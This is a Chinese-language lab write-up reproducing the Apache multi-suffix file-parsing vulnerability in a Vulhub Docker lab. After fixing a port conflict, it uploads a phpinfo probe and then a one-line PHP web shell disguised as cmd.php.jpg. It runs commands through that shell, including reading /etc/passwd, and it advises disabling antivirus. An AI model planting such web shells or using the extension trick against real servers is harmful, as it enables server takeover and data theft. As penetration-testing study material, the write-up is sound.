Apache⽂件解析漏洞
（1）核心漏洞：解析漏洞
漏洞原理：Apache 默认一个文件可含多个以点分隔的后缀，从右往左识别后缀名，只要文件名中包含 .php （⽆需是最后⼀个后缀），就会当作 PHP 脚本执行。
（2）漏洞复现
靶场说明：Vulhub 是开源漏洞环境靶场平台，⽤于漏洞复现、渗透测试学习（选择ubuntu_vulhub
靶机）。  可在/home/enjoy下查看到vulhub-master，它是一个漏洞环境，包含很多漏洞，其中就有中间件漏洞。
虚拟机打开方式：在 VMware 中选择 ubuntu_vulhub.vmx ⽂件，即可启动环境。
登录操作：
a. 终端输入 sudo su root ，切换至root 权限；
b. 密码： root1234%
c. 输入 ifconfig ，获取 Ubuntu 的 IP 地址（后续访问需用到）。
复现步骤：
a. 切换目录： cd /home/enjoy/vulhub-master/httpd/apache_parsing_vulnerability ；
b. 构建镜像： docker-compose build ；
c. 启动环境： docker-compose up -d ；
这里我出现了报错Creating network "apacheparsingvulnerability_default" with the default driver
Creating apacheparsingvulnerability_apache_1 ... 
Creating apacheparsingvulnerability_apache_1 ... error

ERROR: for apacheparsingvulnerability_apache_1  Cannot start service apache: driver failed programming external connectivity on endpoint apacheparsingvulnerability_apache_1 (2cd75d249c707719ecca5e21c1fa80a5414a36be4eb6f746317cb97dcde816d1): Error starting userland proxy: listen tcp 0.0.0.0:80: bind: address already in use（地址已经被占用）

ERROR: for apache  Cannot start service apache: driver failed programming external connectivity on endpoint apacheparsingvulnerability_apache_1 (2cd75d249c707719ecca5e21c1fa80a5414a36be4eb6f746317cb97dcde816d1): Error starting userland proxy: listen tcp 0.0.0.0:80: bind: address already in use
ERROR: Encountered errors while bringing up the project.
 
报错句解释  Error starting userland proxy: listen tcp 0.0.0.0:80: bind: address already in use
        userland proxy:Docker 启动的一个"传话程序",专门负责把宿主机端口上的请求转发进容器
		listen tcp 0.0.0.0:80:它想监听宿主机所有网卡的 80 端口(0.0.0.0 表示"所有网卡都监听")
        bind: address already in use:结果被操作系统拒绝——80号端口已经被占用了
为什么会出现80端口被占用的情况：Ubuntu 虚拟机里装了原生的 Apache(apache2)或 Nginx,开机自启,一直占着 80。	
如果想确认的，可以执行 sudo ss -tlnp | grep ':80'  会列出占用着的进程名和PID，例如我这里的users:(("apache2",pid=12464,fd=4),("apache2",pid=12463,fd=4),("apache2",pid=3370,fd=4))

我们可以查看Docker的端口映射 cat docker-compose.yml
最后一行 ports: - "80:80"（宿主机端口：容器端口）
         左边的 80 = Ubuntu 虚拟机(宿主机)上的 80 号端口
         右边的 80 = 容器内部 Apache 自己监听的 80 号端口

解决方案：改端口映射，给Apache换一个端口号8080
	1.修改docker-compose.yml  
      vim docker-compose.yml
	  i 进行编辑
      把ports: - "80:80" 改成ports: - "8080:80"
	  esc退出编辑模式：wq退出合并保存
	2.重建并启动
	docker-compose down
    docker-compose up -d
    因为映射关系变了，必须down 一次把之前失败的容器清掉再 up。这次应该就能看到:
	Creating apacheparsingvulnerability_apache_1 ... done
    3.验证
	 docker ps                       # 状态应为 Up
	 curl -I http://127.0.0.1:8080/   获取服务器返回的 HTTP 响应头（Response Headers），而不下载网页的实际内容（HTML 正文）。
	 # 应返回 HTTP/1.1 200
 
Ok，这个问题解决了，我们回归正题哈，
d. ⽤浏览器访问靶场⽹站http://ubuntu的ip地址：8080
会发现这是一个可以上传文件的网页

我们需要验证漏洞是否存在（写入phpinfo()探针代码，如果图片能够被当成代码正常执行代表漏洞真实存在）
准备工作：准备好图片马（phpinfo()无害）
新建文件phpinfo.php，并写入内容 <?php phpinfo(); ?> 保存并退出，  嘻嘻  这时的文件图标是一个大象
接着更改后缀名为:phpiinfo.php.png 这时的图标就变了
然后把这个文件上传到刚才的网页，会显示上传成功File uploaded successfully: /var/www/html/uploadfiles/phpinfo.php.png
而/var/www/html/是可以省略的，所以说/uploadfiles/phpinfo.php.png就是典型的文件上传漏洞了
把路径爆出来了，那么这个网站百分之百有漏洞
把这个路径粘贴到IP地址后边，整体就是http://http://192.168.13.138:8080/uploadfiles/phpinfo.php.png再访问
正常执行结果应该是一张图片，结果却是PHP的版本信息
这是因为虽然上传的是图片，但内容是查看PHP版本的代码（phpinfo()），总的来说图片被当做代码执行了
那么就可以证实这个漏洞（文件上传漏洞）确实存在

可以写一些恶意的代码
一句话木马：
新建文件cmd.php，并写入<?php system($_GET['cmd']); ?> 并保存
        <?php ... ?>：PHP的开闭标签，告诉服务器这中间是PHP代码。
        $_GET['cmd']：超全局变量，表示从URL的查询字符串中获取名为 cmd 的参数值（例如 ?cmd=whoami）。
        system()：PHP的执行外部程序函数。它会接收字符串参数，并将其作为操作系统命令执行，然后直接输出原始结果到浏览器。
对了，记得把电脑的杀毒软件关掉，不然会被当做恶意程序杀掉
接着和上面的步骤差不多，将文件重命名为cmd.php.jpg
靶场上传图片马，上传成功，复制路径加上去访问
这时候会报错 Warning: Undefined array key "cmd" in /var/www/html/uploadfiles/cmd.php.jpg on line 1
没关系，这是因为没有传递需要执行的命令导致的报错，我们在URL加上需要执行的代码即可
例如 http://192.13.138：8080/uploadfiles/cmd.php.jpg?cmd=cat /etc/passwd
通过图片木马直接查询到靶场服务器内部用户信息
或者
http://192.168.13.138：8080/uploadfiles/cmd.php.jpg?cmd=uname -a
因为docker里面的容器与宿主机共享内核所以查出来的是宿主机的主机信息
或者
http://192.168.13.138：8080/uploadfiles/cmd.php.jpg?cmd=ifconfig
疑问：为什么用ifconfig查这个受害者主机的内网地址会是空的？
      这个靶场用的是容器，没有安装ifconfig相关的软件（插件名字为net-tools） 所以浏览器返回结果为空
      解决方法：尝试其他命令比如：ip addr  或者  ip a  或者  hostname -I
      最终结果就是能够查到这个docker容器的IP地址
或者其他远程代码执行命令 
http://192.168.13.138:8080/uploadfiles/cmd.php.jpg?cmd=ls /
查询到这个系统的文件目录信息

Apache 靶场用完之后需要关掉 docker-compose down
		
总结：文件名包含.php但后缀是.jpg，骗过检测系统当图片上传，Apache解析时看到.php就当作脚本执行，从而实现木马上传调用
漏洞危害：攻击者可利用文件上传功能，植入恶意脚本(如webshelI);获取服务器权限，读取、修改服务器文件，甚至控制整个服务器。
  